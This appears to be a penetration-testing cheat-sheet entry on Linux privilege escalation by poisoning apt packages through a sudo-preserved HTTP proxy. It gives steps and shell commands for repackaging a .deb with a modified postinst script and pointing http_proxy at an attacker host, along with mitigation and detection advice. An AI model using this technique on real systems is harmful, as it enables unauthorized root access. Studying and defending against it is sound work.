---
topic: APT — package poisoning through a proxy
tags: [linux, apt, proxy, supply-chain, privesc]
---

# APT — package poisoning through a proxy

**English** | [🌐 Español](apt-proxy-package-poisoning.md)

## Concept

If a user can run `apt-get update` and `apt-get upgrade` with sudo while preserving a custom HTTP proxy, they control the channel apt uses to download metadata and packages. A fake repository can advertise a higher version of an installed package; its `postinst` script runs as root during the upgrade.

## When it applies

- `sudo -l` allows `apt-get update` or `upgrade` and `env_keep` preserves `http_proxy`.
- A repository in `sources.list.d` can be impersonated.
- The user can build a package with the same architecture and a higher version.

## Procedure

1. Review `sudo -l`, `sources.list` and `env_keep`.
2. Pick an installed package, unpack it and add an action to `postinst`.
3. Repackage with a higher version and build consistent `Packages`/`Release` files.
4. Run the proxy, then execute `apt-get update` and `apt-get upgrade` as root.

## Commands

```bash
sudo -l
cat /etc/apt/sources.list /etc/apt/sources.list.d/*.list
dpkg -l | grep <PACKAGE>
dpkg-deb -R package.deb build && dpkg-deb -b build package_1.0_all.deb
export http_proxy=http://<IP>:8888
sudo apt-get update && sudo apt-get upgrade
```

## Variants

- Serve an unsigned `Release` when apt does not require signatures.
- Use a package that already has a `postinst` and append a line.
- Poison only `Packages.gz` so apt sees a new version.

## Limitations

- Signed repositories and trusted keys block the fake package.
- `apt-get` may require interactive confirmation.
- The version and architecture must match the system.

## Mitigation

- Do not preserve `http_proxy` in sudo rules and do not allow arbitrary `apt`.
- Require signed repositories and verify key fingerprints.
- Apply an egress allowlist and monitor `sources.list.d`.

## Detection

- Packages installed from a host that is not the official repository.
- `postinst` executions that spawn shells or create users.
- `Packages` changes with higher versions outside a deployment.

## References

- [0xdf — OneTwoSeven](https://0xdf.gitlab.io/2019/08/31/htb-onetwoseven.html)
- [Debian — apt.conf(5)](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)
- [CWE-494 — Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
